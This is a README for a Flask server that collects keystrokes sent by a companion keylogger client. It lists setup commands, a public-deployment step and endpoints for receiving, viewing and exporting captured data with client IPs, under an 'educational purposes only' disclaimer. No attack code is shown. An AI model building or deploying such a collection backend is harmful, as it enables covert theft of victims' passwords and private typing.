# Simple flask server with endpoint for logging keystrokes

## FOR EDUCATIONAL PURPOSES ONLY - USE ONLY WITH PROPER AUTHORIZATION

This is a Flask web server that receives and stores keystroke data from the [keylogger client](https://github.com/AntonMartic/python-keylogger).

### Installation & Setup
1. Clone the repository
   ```bash
    git clone https://github.com/AntonMartic/flask-server.git
    cd flask-server
    ```
2. Create and activate virtual environment
   ```bash
    # macOS/Linux
    python -m venv flask_env
    source flask_env/bin/activate
    
    # Windows
    python -m venv flask_env
    flask_env\Scripts\activate
    ```
3. Install dependencies
   ```bash
    pip install -r requirements.txt
    ```
4. Run the server locally
   ```bash
    python keylogger_server.py
    ```
   Server will start at: `http://127.0.0.1:5000`
5. Deploy server to PythonAnywhere or similar
   
### API Endpoints
- GET / - Web interface to view captured data
- POST /log - Receive keylogger data (used by client)
- GET /api/logs - JSON API to retrieve all logs

### Features
- Receives POST requests from keylogger clients
- Stores data with timestamps and client IP addresses
- Web interface for viewing captured data
- JSON API for data access
- Basic input validation and error handling


